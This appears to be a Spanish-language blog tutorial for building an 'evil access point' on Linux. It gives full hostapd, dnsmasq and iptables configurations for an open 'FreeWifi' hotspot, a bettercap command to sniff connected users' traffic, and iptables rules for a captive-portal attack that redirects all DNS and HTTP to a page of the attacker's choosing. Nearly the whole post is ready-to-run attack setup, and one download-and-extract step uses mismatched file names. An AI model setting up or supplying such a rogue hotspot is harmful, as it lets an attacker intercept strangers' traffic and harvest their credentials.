---
layout: post
title: Evil Access Point
---

Evil Access Point with Linux

![_config.yml]({{ site.baseurl }}/images/20160711.jpeg)


# Materiales
* TL-WN722N (tarjeta de red tp-link)


# Instalando las herramientas
```
sudo apt-get update && sudo apt-get dist-upgrade -y
sudo apt-get install -y hostapd dnsmasq wireless-tools iw
```

### Instalando bettercap
```
sudo apt-get install curl ruby-dev libpcap-dev -y
sudo gem install bettercap
```

# Configuracion
Para trabajar recomiendo crear una carpeta con algun nombre caracteristico como `fakeap`. Luego, crear 3 archivos de configuracion usando algun editor de texto (dentro de la carpeta creada). En el caso de iptables, hay que darle permisos de ejecucion `chmod +x iptables` Suponiendo que trabajaremos con `eth0` y `wlan0`

### iptables
```
ifconfig wlan0 10.0.0.1/24 up
iptables -t nat -F
iptables -F
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
echo '1' > /proc/sys/net/ipv4/ip_forward
```

### dnsmasq.conf
```
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
```

### hostapd.conf
```
interface=wlan0
driver=nl80211
ssid=FreeWifi
channel=6
```

# Automatizando la configuracion
Creamos un archivo con algun nombre caracteristico, por ejemplo `initconfig` luego, darle los correspondientes permisos de ejecucion `chmod +x initconfig`

```bash
#!/bin/bash

# Configuraciones iniciales
upstream=eth0
phy=wlan0

# levantando interfaz
ifconfig $phy 10.0.0.1/24 up

# configurando iptables
iptables -t nat -F
iptables -F
iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
echo '1' > /proc/sys/net/ipv4/ip_forward

# Configurando dnsmasq
cat <<EOF > dnsmasq.conf
interface=$phy
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Configurando hostapd
cat <<EOF > hostapd.conf
interface=$phy
driver=nl80211
ssid=FreeWifi
channel=6
EOF
```

# Evil Access Point UP!
Ahora que tenemos las configuraciones hechas, nos toca levantar el Access Point. Para eso ejecutaremos en cada terminal distinta lo siguiente:

```
sudo ./initconfig

sudo dnsmasq -C dnsmasq.conf -d

sudo hostapd hostapd.conf
```

### Bettercap
Iniciamos el sniffer (podemos ocupar cualquiera mientras realice sniffing pasivo, pero esta vez elegí bettercap)

```
sudo su
bettercap -I wlan0 --no-discovery --no-spoofing -X
```

# Revisando la red
Para poder ver quien esta en la red interna se recomienda descargar fing desde la página oficial: [https://www.fing.io/download/](https://www.fing.io/download/){:target="_blank"}

```
wget https://www.fing.io/wp-content/uploads/2016/10/overlook-fing-3.0.deb
sudo dpkg -i overlook-fing-3.0.deb
sudo fing 10.0.0.1/24
```

# Portal cautivo
Para realizar un ataque de portal cautivo no es necesario tener conexion a internet, solo basta levantar el Fake Access Point, pero cambiando las reglas. La idea de este ataque es dejar arriba el servicio de apache con alguna pagina a conveniencia.

```bash
iptables -F
iptables -F -t nat
#iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
#iptables -A FORWARD -i $phy -o eth0 -j ACCEPT
iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to 10.0.0.1
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
iptables -P FORWARD DROP
```

# En caso de ocupar 2 wlans
Muchas veces no tenemos acceso por ethernet, por lo que estamos obligados a usar wifi para recibir `wlan0` y emitir `wlan1` señal. Para estos casos las configuraciones varian un poco. (Asumiendo de que tambien hay que modificar las configuraciones anteriores como `iptables`, `dnsmasq.conf` y `hostapd.conf` con sus interfaces respectivos)

### Raspbian
Con un editor de texto hay que modificar el archivo `/etc/network/interfaces`, comentando las lineas que tengan relación con la interfaz
 que ocuparás para crear el Evil Access Point.

```
# interfaces(5) file used by ifup(8) and ifdown(8)

# Please note that this file is written to be used with dhcpcd
# For static IP, consult /etc/dhcpcd.conf and 'man dhcpcd.conf'

# Include files from /etc/network/interfaces.d:
source-directory /etc/network/interfaces.d

auto lo
iface lo inet loopback

iface eth0 inet manual

allow-hotplug wlan0
iface wlan0 inet manual
    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf

#allow-hotplug wlan1
#iface wlan1 inet manual
    #wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf
```

Recomiendo reiniciar para que las configuraciones se apliquen

```
sudo reboot
```


### network-manager
Se tiene que agregar las 2 ultimas lineas del archivo `/etc/NetworkManager/NetworkManager.conf`, para evitar el conflicto entre la interfaz de red y network-manager

```
[main]
plugins=ifupdown,keyfile

[ifupdown]
managed=false

[keyfile]
unmanaged-devices=interface-name:wlan1
```

Ahora necesitamos reiniciar el servicio de network-manager

```
sudo service network-manager restart
```

# Conectarse por 3G
```
sudo apt-get install ppp
sudo wget "http://downloads.sourceforge.net/project/vim-n4n0/sakis3g.tar.gz?r=http%3A%2F%2Fsourceforge.net%2Fprojects%2Fvim-n4n0%2Ffiles%2F&ts=1363537696&use_mirror=tene~t" -O sakis3g.tar.gz
sudo tar -xzvf sakis36.tar.gz
sudo apt-get install sg3-utils
sudo chmod +x sakis3g
sudo ./sakis3g --interactive
```
